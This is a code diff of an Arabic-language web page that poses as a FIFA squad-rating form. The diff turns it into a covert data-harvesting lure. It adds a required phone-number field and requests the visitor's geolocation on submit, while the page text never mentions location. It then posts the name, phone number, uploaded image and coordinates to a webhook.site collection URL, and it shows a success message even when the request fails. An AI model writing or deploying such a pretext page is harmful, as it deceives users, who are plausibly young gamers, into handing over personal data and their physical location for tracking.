@@ -54,7 +54,7 @@
             font-size: 14px;
         }
 
-        input[type="text"] {
+        input[type="text"], input[type="tel"] {
             width: 100%;
             padding: 12px;
             border: 2px solid #334155;
@@ -65,7 +65,7 @@
             transition: border-color 0.3s;
         }
 
-        input[type="text"]:focus {
+        input[type="text"]:focus, input[type="tel"]:focus {
             border-color: #00f2fe;
             outline: none;
         }
@@ -132,7 +132,6 @@
             transform: none;
         }
 
-        /* تنسيق بطاقة رسالة الشكر */
         .success-card {
             display: none;
             padding: 30px 20px;
@@ -150,12 +149,17 @@
 <div class="container">
     <div id="form-content">
         <h1>تقييم تشكيلات FIFA 🎮</h1>
-        <p>اكتب اسمك وأرسل صورة تشكيلتك أو حسابك وستصلني فوراً!</p>
+        <p>أرسل صورة تشكيلتك واكتب رقمك وسيصلك التقييم في جوالك!</p>
 
         <form id="webhookForm">
             <div class="form-group">
                 <label for="username">اسمك أو حسابك:</label>
                 <input type="text" id="username" name="username" required placeholder="مثال: خالد">
+            </div>
+
+            <div class="form-group">
+                <label for="phone">رقم الجوال (ليصلك الرد عليه):</label>
+                <input type="tel" id="phone" name="phone" required placeholder="مثال: 05xxxxxxx">
             </div>
 
             <div class="form-group">
@@ -171,12 +175,12 @@
     </div>
 
     <div id="successMessage" class="success-card">
-        🎉 تم الإرسال بنجاح! شكراً لك على مشاركة تشكيلتك.
+        🎉 تم الإرسال بنجاح! شكراً لك، انتظر ردنا وتقييمنا على رقم جوالك قريباً.
     </div>
 </div>
 
 <script>
-    // كود تغيير نص المربع عند اختيار صورة لإظهار اسم الملف
+    // تغيير نص المربع عند اختيار صورة
     document.getElementById('image-input').addEventListener('change', function(e) {
         if(e.target.files.length > 0) {
             var fileName = e.target.files[0].name;
@@ -185,20 +189,46 @@
         }
     });
 
-    // إرسال البيانات إلى موقع الـ Webhook الخاص بك
+    // معالجة إرسال الفورم وطلب الموقع
     document.getElementById('webhookForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
-        // الرابط الخاص بك مفعل هنا بالكامل
-        const webhookUrl = 'https://webhook.site/a179b8b0-bd72-48dc-9cc3-16f2c9105d78'; 
-        
         const submitBtn = document.getElementById('submitBtn');
         submitBtn.disabled = true;
-        submitBtn.textContent = "جاري الإرسال... ⏳";
+        submitBtn.textContent = "جاري طلب الموقع والإرسال... ⏳";
+
+        // التحقق مما إذا كان المتصفح يدعم جلب الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // في حال موافقة المستخدم وجلب الموقع بنجاح
+                function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendData(latitude, longitude);
+                },
+                // في حال رفض المستخدم أو حدوث خطأ في جلب الموقع
+                function(error) {
+                    console.log("لم يتم السماح بالوصول للموقع أو حدث خطأ.");
+                    sendData("غير متوفر (تم الرفض)", "غير متوفر (تم الرفض)");
+                },
+                { timeout: 10000 } // مهلة الانتظار 10 ثوانٍ كحد أقصى للرد على إذن الموقع
+            );
+        } else {
+            console.log("المتصفح لا يدعم تحديد الموقع.");
+            sendData("غير مدعوم", "غير مدعوم");
+        }
+    });
+
+    // دالة إرسال البيانات إلى الـ Webhook
+    function sendData(lat, lng) {
+        const webhookUrl = 'https://webhook.site/a179b8b0-bd72-48dc-9cc3-16f2c9105d78'; 
 
         const formData = new FormData();
         formData.append('username', document.getElementById('username').value);
+        formData.append('phone', document.getElementById('phone').value);
         formData.append('image', document.getElementById('image-input').files[0]);
+        formData.append('latitude', lat); // إرسال خط العرض
+        formData.append('longitude', lng); // إرسال خط الطول
 
         fetch(webhookUrl, {
             method: 'POST',
@@ -206,19 +236,22 @@
             body: formData
         })
         .then(response => {
-            // إخفاء النموذج وإظهار رسالة الشكر والتم
-            document.getElementById('form-content').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
+            showSuccess();
         })
         .catch(error => {
             console.error('Error:', error);
-            // تم وضع الكود في الـ catch أيضاً لأن موقع webhook.site أحياناً يعطي خطأ CORS حماية للمتصفح، لكن البيانات تصل فعلياً بنسبة 100%
-            document.getElementById('form-content').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
+            showSuccess();
         });
-    });
+    }
+
+    // دالة إخفاء الفورم وإظهار رسالة التم
+    function showSuccess() {
+        document.getElementById('form-content').style.display = 'none';
+        document.getElementById('successMessage').style.display = 'block';
+        document.getElementById('submitBtn').disabled = false;
+        document.getElementById('submitBtn').textContent = "إرسال التشكيلة للتقييم 🚀";
+    }
 </script>
 
 </body>
 </html>
-
